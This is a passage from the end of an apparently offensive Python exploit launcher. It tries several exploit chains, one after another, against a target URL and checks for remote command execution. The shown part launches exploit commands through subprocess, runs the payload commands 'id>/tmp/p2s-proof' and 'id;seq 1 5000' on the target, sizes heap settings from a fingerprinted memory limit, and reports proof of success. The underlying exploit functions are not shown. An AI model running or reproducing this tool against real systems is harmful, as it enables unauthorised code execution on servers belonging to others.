                    print(f"[-] {exc}", file=sys.stderr)
                    return 1
                candidates = [dict(chosen, chain="session")]

        if (prod_candidates and args.workers is None and
                args.production_workers is None and not args.auto and
                any(c.get("chain") == "production" for c in candidates)):
            print(f"[*] production worker count defaults to {prod_workers}; "
                  f"pass --workers or --production-workers for a different pool",
                  flush=True)

        for index, chosen in enumerate(candidates, 1):
            if chosen.get("chain") == "production":
                chosen_workers = int(chosen.get("workers") or prod_workers)
                command = production_command(
                    chosen, args.url, args, chosen_workers)
                print(f"[*] attempt {index}/{len(candidates)}: "
                      f"{chosen['name']} (stock-production, "
                      f"workers={chosen_workers})", flush=True)
            else:
                huge = recommended_huge_mb(chosen, fp.get("memory_limit"))
                cmd = args.cmd
                if args.response_proof and cmd == "id>/tmp/p2s-proof":
                    cmd = "id;seq 1 5000"
                command = profile_command(chosen, args.url, cmd,
                                          args.proof_file, huge_mb=huge)
                if args.response_proof:
                    command.append("--response-proof")
                print(f"[*] attempt {index}/{len(candidates)}: "
                      f"{chosen['name']} (huge_mb={huge})", flush=True)
            print("[*] running:", " ".join(command), flush=True)
            try:
                Path(args.proof_file).unlink()
            except OSError:
                pass
            try:
                rc = subprocess.run(command).returncode
            except OSError as exc:
                print(f"[-] could not launch exploit: {exc}", file=sys.stderr)
                return 1
            if args.response_proof:
                if rc == 0:
                    print("[+] response proof reported")
                    return 0
                print(f"[-] attempt {index} exited {rc}; no response proof",
                      file=sys.stderr)
                continue
            if Path(args.proof_file).is_file():
                print("[+] proof file:", args.proof_file)
                print(Path(args.proof_file).read_text(errors="replace").strip())
                return 0
            print(f"[-] attempt {index} exited {rc}; no proof at "
                  f"{args.proof_file}", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        raise SystemExit(130)
